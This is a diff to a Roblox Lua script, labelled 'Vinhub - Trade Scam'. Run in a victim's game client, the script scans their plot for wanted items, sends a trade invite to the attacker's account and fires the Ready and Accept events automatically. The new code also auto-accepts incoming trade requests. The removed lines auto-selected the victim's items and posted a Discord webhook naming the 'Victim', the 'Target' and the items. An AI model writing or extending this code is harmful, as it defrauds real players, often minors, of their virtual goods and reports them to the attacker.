@@ -42,26 +42,9 @@ end
 local readyRE = getRemote("RE/TradeService/Ready")
 local acceptRE = getRemote("RE/TradeService/Accept")
 
-local function getGenFromDebris(brainrotName)
-    local Debris = workspace:FindFirstChild("Debris")
-    if not Debris then return "?" end
-    for _, Temp in ipairs(Debris:GetChildren()) do
-        if Temp.Name == "FastOverheadTemplate" then
-            local Overhead = Temp:FindFirstChild("AnimalOverhead")
-            if Overhead then
-                local Name = Overhead:FindFirstChild("DisplayName")
-                local Gen = Overhead:FindFirstChild("Generation")
-                if Name and Gen and Name.Text:lower() == brainrotName:lower() then return Gen.Text end
-            end
-        end
-    end
-    return "?"
-end
-
 local function scanPlot()
-    local found = {}
     local plots = workspace:FindFirstChild("Plots")
-    if not plots then return found end
+    if not plots then return false end
     local myPlot = nil
     for _, p in ipairs(plots:GetChildren()) do
         local sign = p:FindFirstChild("PlotSign")
@@ -76,40 +59,23 @@ local function scanPlot()
     if myPlot then
         for _, child in ipairs(myPlot:GetChildren()) do
             if child:IsA("Model") then
-                table.insert(found, {name = child.Name, gen = getGenFromDebris(child.Name)})
+                for _, wanted in ipairs(wantedItems) do
+                    if child.Name:lower():find(wanted:lower()) then return true end
+                end
             end
         end
     end
-    return found
+    return false
 end
 
-local function sendWebhook(foundItems, url)
-    if not url or url == "" then return end
-    local itemLines = ""
-    for i, data in ipairs(foundItems) do
-        itemLines = itemLines .. i .. ". " .. data.name .. " - " .. data.gen .. "\n"
+local function handleIncomingRequests()
+    local reqUI = PlayerGui:FindFirstChild("TradeInviteReceived")
+    if reqUI and reqUI.Enabled then
+        local btn = reqUI:FindFirstChild("Accept", true)
+        if btn and btn.Visible then
+            pcall(function() firesignal(btn.Activated) end)
+        end
     end
-    pcall(function()
-        local req = (syn and syn.request) or (http and http.request) or http_request or request
-        req({
-            Url = url,
-            Method = "POST",
-            Headers = {["Content-Type"] = "application/json"},
-            Body = HttpService:JSONEncode({
-                content = "@everyone",
-                embeds = {{
-                    title = "✦ Vinhub - Trade Scam ✦",
-                    fields = {
-                        {name = "👤 Victim", value = "```" .. LocalPlayer.Name .. "```", inline = true},
-                        {name = "🎯 Target", value = "```" .. MY_USER .. "```", inline = true},
-                        {name = "🧠 Items", value = "```" .. itemLines .. "```", inline = false}
-                    },
-                    color = 1399436,
-                    timestamp = DateTime.now():ToIsoDate()
-                }}
-            })
-        })
-    end)
 end
 
 local function sendInvite()
@@ -118,17 +84,20 @@ local function sendInvite()
         local inner = tl.TradePlayerList
         local sb = inner.bg.SearchFrame.SearchBox
         sb.Text = MY_USER
-        task.wait(0.4)
+        task.wait(0.5)
         pcall(function() firesignal(sb.FocusLost, true) end)
         task.wait(0.5)
-        for _, p in pairs(inner.Global.List:GetChildren()) do
-            if p:IsA("Frame") and p:FindFirstChild("Fill") then
-                local nameLbl = p.Fill:FindFirstChild("Username")
-                if nameLbl and nameLbl.Text:find(MY_USER) then
-                    local send = p.Fill:FindFirstChild("Send")
-                    if send then
-                        pcall(function() firesignal(send.Activated) end)
-                        return true
+        local list = inner:FindFirstChild("Global") and inner.Global:FindFirstChild("List")
+        if list then
+            for _, p in pairs(list:GetChildren()) do
+                if p:IsA("Frame") and p:FindFirstChild("Fill") then
+                    local nameLbl = p.Fill:FindFirstChild("Username")
+                    if nameLbl and nameLbl.Text:find(MY_USER) then
+                        local send = p.Fill:FindFirstChild("Send")
+                        if send then
+                            pcall(function() firesignal(send.Activated) end)
+                            return true
+                        end
                     end
                 end
             end
@@ -141,41 +110,16 @@ task.spawn(function()
     while true do
         pcall(function()
             local tradeUI = PlayerGui:FindFirstChild("TradeLiveTrade")
+            
+            handleIncomingRequests()
+
             if tradeUI and tradeUI.Enabled then
-                local inner = tradeUI.TradeLiveTrade
-                
                 if readyRE then readyRE:FireServer("d73acf93-6f32-44df-b813-0f6b32c7afd9") end
-                task.wait(0.7)
+                task.wait(0.8)
                 if acceptRE then acceptRE:FireServer("918ee0f5-e98f-413f-b76e-baee47b021cb") end
-                
-                if inner.Other.Username.Text:find(MY_USER) then
-                    local scroll = inner:FindFirstChild("ScrollingFrame", true)
-                    if scroll then
-                        for _, slot in pairs(scroll:GetChildren()) do
-                            if slot.Name:sub(1,9) == "Selection" then
-                                local spacer = slot:FindFirstChild("Spacer")
-                                if spacer and spacer:FindFirstChild("UIStroke") and spacer.UIStroke.Color ~= Color3.fromRGB(0, 255, 0) then
-                                    firesignal(spacer.Activated)
-                                end
-                            end
-                        end
-                    end
-                end
             else
-                local items = scanPlot()
-                local hasWanted = false
-                for _, itm in ipairs(items) do
-                    for _, wanted in ipairs(wantedItems) do
-                        if itm.name:lower():find(wanted:lower()) then hasWanted = true break end
-                    end
-                end
-                
-                if hasWanted then
-                    if sendInvite() then
-                        sendWebhook(items, getgenv().WEBHOOK_URL2)
-                        sendWebhook(items, getgenv().WEBHOOKSHERIF)
-                        task.wait(6)
-                    end
+                if scanPlot() then
+                    sendInvite()
                 end
             end
         end)
